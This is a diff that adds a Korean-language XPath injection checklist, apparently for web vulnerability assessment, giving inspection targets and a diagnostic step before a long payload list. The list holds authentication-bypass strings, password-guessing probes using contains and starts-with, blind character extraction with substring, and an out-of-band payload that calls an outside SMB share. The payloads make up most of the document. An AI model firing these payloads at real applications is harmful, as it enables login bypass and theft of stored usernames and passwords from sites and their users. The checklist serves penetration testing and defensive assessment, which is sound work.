@@ -1,1 +1,53 @@
+취약점 소개
+--------------------------
+악의적인 XPath 쿼리를 삽입하여 웹 애플리케이션의 XML 데이터를 조회 및 조작될 수 있는 취약점
 
+점검 대상
+--------------------------
+- 웹 애플리케이션 소스 코드
+- 웹 방화벽
+
+진단 방법
+--------------------------
+- 쿼리 입력 값에 대한 검증이 적절히 이뤄졌는지 확인
+
+Payload
+--------------------------
+-> 쿼리의 참, 거짓에 따라 반환되는 페이지가 다른지 확인
+'and'a'='a, 'and'a'='b
+and 1=1, and 1=2
+
+-> 에러가 발생하지 않는지 확인
+‘ or count(parent::[position()=1])=0 or ‘a’='b
+‘ or count(parent::[position()=1])>0 or ‘a’='b
+1 or count(parent::[position()=1])=0
+1 or count(parent::[position()=1])>0
+
+-> Similar to
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+search=')] | //user/*[contains(*,'
+search=Har') and contains(../password,'c
+search=Har') and starts-with(../password,'c
+
+Blind Exploitation:
+-> Size of a string
+and string-length(accoun)=SIZE_INT
+
+-> Extract a charactor
+substring(//user[userid=5]/username,2,1)=CHAR_HERE
+substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+
+-> Out Of Band Exploitation
+http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
